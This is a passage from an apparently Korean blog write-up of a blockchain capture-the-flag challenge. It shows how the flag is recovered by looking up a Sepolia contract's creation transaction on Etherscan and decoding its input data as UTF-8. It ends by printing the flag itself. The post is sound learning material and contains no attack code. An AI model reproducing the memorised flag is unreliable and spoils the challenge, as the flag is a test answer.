<li>블록체인의 불변성에 따라, 배포 당시의 Transaction Input Data에는 초기화 값인 진짜 플래그가 평문으로 남아있을 것이다.</li>
</ul>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">이제</p>
<p data-ke-size="size16"><a href="https://sepolia.etherscan.io/">https://sepolia.etherscan.io/</a></p>
<p data-ke-size="size16">사이트에 접속해서 문제에서 제공한 0xe94727421453c3782585e20e502e57e47c0C446B를 검색한다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="830" data-origin-height="173"><span data-url="https://blog.kakaocdn.net/dn/yYXS1/dJMcajukcCX/CV56zkIaLitiQMaf8m08JK/img.png" data-phocus="https://blog.kakaocdn.net/dn/yYXS1/dJMcajukcCX/CV56zkIaLitiQMaf8m08JK/img.png"><img src="https://blog.kakaocdn.net/dn/yYXS1/dJMcajukcCX/CV56zkIaLitiQMaf8m08JK/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FyYXS1%2FdJMcajukcCX%2FCV56zkIaLitiQMaf8m08JK%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="830" height="173" data-origin-width="830" data-origin-height="173"/></span></figure>
</p>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16">그럼 하나가 나오는데 보면 별 정보가 없다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1396" data-origin-height="837"><span data-url="https://blog.kakaocdn.net/dn/kYQJV/dJMcahDh5iX/Ece9WtwSYksHCjCroMbgYk/img.png" data-phocus="https://blog.kakaocdn.net/dn/kYQJV/dJMcahDh5iX/Ece9WtwSYksHCjCroMbgYk/img.png"><img src="https://blog.kakaocdn.net/dn/kYQJV/dJMcahDh5iX/Ece9WtwSYksHCjCroMbgYk/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FkYQJV%2FdJMcahDh5iX%2FEce9WtwSYksHCjCroMbgYk%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1396" height="837" data-origin-width="1396" data-origin-height="837"/></span></figure>
</p>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16">More Info에 보면 있는 트랜션 링크로 들어간다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1377" data-origin-height="263"><span data-url="https://blog.kakaocdn.net/dn/GrW20/dJMcaioHmpJ/AiDkSAznCO3mbskppBqWDk/img.png" data-phocus="https://blog.kakaocdn.net/dn/GrW20/dJMcaioHmpJ/AiDkSAznCO3mbskppBqWDk/img.png"><img src="https://blog.kakaocdn.net/dn/GrW20/dJMcaioHmpJ/AiDkSAznCO3mbskppBqWDk/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FGrW20%2FdJMcaioHmpJ%2FAiDkSAznCO3mbskppBqWDk%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1377" height="263" data-origin-width="1377" data-origin-height="263"/></span></figure>
</p>
<p data-ke-size="size16">그럼 두개가 나오는데 Contract Creation라 적힌 맨 윗줄의 트랜젝션을 클릭한다.</p>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16">그럼 거기서 아래 사진과 같은 정보를 찾을 수 있는데</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1349" data-origin-height="417"><span data-url="https://blog.kakaocdn.net/dn/dJxEgW/dJMcabC6zIq/6KVeWVw6hOw1YoXcVUdv70/img.png" data-phocus="https://blog.kakaocdn.net/dn/dJxEgW/dJMcabC6zIq/6KVeWVw6hOw1YoXcVUdv70/img.png"><img src="https://blog.kakaocdn.net/dn/dJxEgW/dJMcabC6zIq/6KVeWVw6hOw1YoXcVUdv70/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdJxEgW%2FdJMcabC6zIq%2F6KVeWVw6hOw1YoXcVUdv70%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1349" height="417" data-origin-width="1349" data-origin-height="417"/></span></figure>
</p>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16">보기 힘드니 설정을 UTF-8로 바꾸면</p>
<p><figure class="imageblock alignLeft" data-ke-mobileStyle="widthOrigin" data-origin-width="221" data-origin-height="181"><span data-url="https://blog.kakaocdn.net/dn/bDXGr9/dJMcajnxwVf/8mnVoWDcB4SiAAKjfzph7K/img.png" data-phocus="https://blog.kakaocdn.net/dn/bDXGr9/dJMcajnxwVf/8mnVoWDcB4SiAAKjfzph7K/img.png"><img src="https://blog.kakaocdn.net/dn/bDXGr9/dJMcajnxwVf/8mnVoWDcB4SiAAKjfzph7K/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbDXGr9%2FdJMcajnxwVf%2F8mnVoWDcB4SiAAKjfzph7K%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="221" height="181" data-origin-width="221" data-origin-height="181"/></span></figure>
</p>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16">플래그가 나온다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1339" data-origin-height="159"><span data-url="https://blog.kakaocdn.net/dn/rjZ0l/dJMcahXCgpq/2vwFGZQk8qz1yZg5CUNxzk/img.png" data-phocus="https://blog.kakaocdn.net/dn/rjZ0l/dJMcahXCgpq/2vwFGZQk8qz1yZg5CUNxzk/img.png"><img src="https://blog.kakaocdn.net/dn/rjZ0l/dJMcahXCgpq/2vwFGZQk8qz1yZg5CUNxzk/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FrjZ0l%2FdJMcahXCgpq%2F2vwFGZQk8qz1yZg5CUNxzk%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1339" height="159" data-origin-width="1339" data-origin-height="159"/></span></figure>
</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">Flag: INCOGNITO{6da713e699aecfeba6aecfeba6da713ebc9bc95c666a87efb155c666a87efb15}</p>
